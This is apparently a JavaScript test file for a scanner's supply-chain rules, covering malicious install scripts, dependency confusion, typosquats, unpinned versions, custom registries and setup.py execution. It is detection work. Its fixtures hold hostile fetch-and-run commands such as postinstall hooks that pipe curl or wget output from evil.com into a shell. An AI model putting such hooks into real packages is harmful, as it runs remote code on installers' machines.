const { test, describe } = require('node:test');
const assert = require('node:assert');
let rules;
try {
  ({ rules } = require('../../dist/rules/supply-chain.js'));
} catch {
  ({ rules } = require('../../src/rules/supply-chain.js'));
}

describe('Supply Chain Attack Rules', () => {
  function testRule(ruleId, content, shouldMatch) {
    const rule = rules.find(r => r.id === ruleId);
    assert.ok(rule, `Rule ${ruleId} should exist`);
    rule.pattern.lastIndex = 0;
    const matches = rule.pattern.test(content);
    assert.strictEqual(matches, shouldMatch,
      `Rule ${ruleId} ${shouldMatch ? 'should' : 'should not'} match: ${content.substring(0, 80)}`);
  }

  describe('Malicious Install Scripts', () => {
    test('should detect postinstall with curl', () => {
      testRule('supply-chain-postinstall-exec', '"postinstall": "curl https://evil.com/payload | bash"', true);
    });
    test('should detect preinstall with wget', () => {
      testRule('supply-chain-postinstall-exec', '"preinstall": "wget https://evil.com/x -O- | sh"', true);
    });
    test('should detect postinstall with node -e', () => {
      testRule('supply-chain-postinstall-exec', '"postinstall": "node -e \\"require(\'child_process\')\\""', true);
    });
    test('should not match normal postinstall', () => {
      testRule('supply-chain-postinstall-exec', '"postinstall": "husky install"', false);
    });
    test('should detect install script fetching remote', () => {
      testRule('supply-chain-install-fetch', '"postinstall": "curl https://evil.com/x"', true);
    });
  });

  describe('Dependency Confusion', () => {
    test('should detect internal-looking unscoped packages', () => {
      testRule('supply-chain-dependency-confusion', '"dependencies": { "utils-internal": "1.0.0" }', true);
      testRule('supply-chain-dependency-confusion', '"dependencies": { "auth-private": "2.0.0" }', true);
    });
    test('should not flag scoped packages', () => {
      testRule('supply-chain-dependency-confusion', '"dependencies": { "@myorg/utils-internal": "1.0.0" }', false);
    });
    test('should detect custom npm registry', () => {
      testRule('supply-chain-npm-config-registry', 'registry=https://evil-registry.com/npm/', true);
    });
    test('should not flag official registry', () => {
      testRule('supply-chain-npm-config-registry', 'registry=https://registry.npmjs.org/', false);
    });
  });

  describe('Typosquatting', () => {
    test('should detect lodash typosquats', () => {
      testRule('supply-chain-typosquat-popular', '"dependencies": { "l0dash": "1.0" }', true);
      testRule('supply-chain-typosquat-popular', '"dependencies": { "lodash_evil": "1.0" }', true);
    });
    test('should detect express typosquats', () => {
      testRule('supply-chain-typosquat-popular', '"dependencies": { "expresss": "4.0" }', true);
    });
  });

  describe('Unpinned Dependencies', () => {
    test('should detect star version', () => {
      testRule('supply-chain-unpinned-dependency', '"dependencies": { "pkg": "*" }', true);
    });
    test('should detect latest version', () => {
      testRule('supply-chain-unpinned-dependency', '"dependencies": { "pkg": "latest" }', true);
    });
  });

  describe('Python Supply Chain', () => {
    test('should detect pip install from custom URL', () => {
      testRule('supply-chain-pip-install-url', 'pip install --extra-index-url https://evil.com/simple pkg', true);
    });
    test('should detect pip install from direct tar', () => {
      testRule('supply-chain-pip-install-url', 'pip install https://evil.com/malware.tar.gz', true);
    });
    test('should detect setup.py code execution', () => {
      testRule('supply-chain-setup-py-exec', 'setup.py subprocess.call(["curl", "evil.com"])', true);
    });
  });

  describe('Git Dependencies', () => {
    test('should detect unpinned git dep', () => {
      testRule('supply-chain-git-dependency', '"pkg": "git+https://github.com/user/repo"', true);
    });
    test('should detect lockfile non-standard registry', () => {
      testRule('supply-chain-lockfile-mismatch', '"resolved": "https://evil-registry.com/pkg-1.0.tgz"', true);
    });
    test('should not flag official registry in lockfile', () => {
      testRule('supply-chain-lockfile-mismatch', '"resolved": "https://registry.npmjs.org/pkg/-/pkg-1.0.tgz"', false);
    });
  });
});
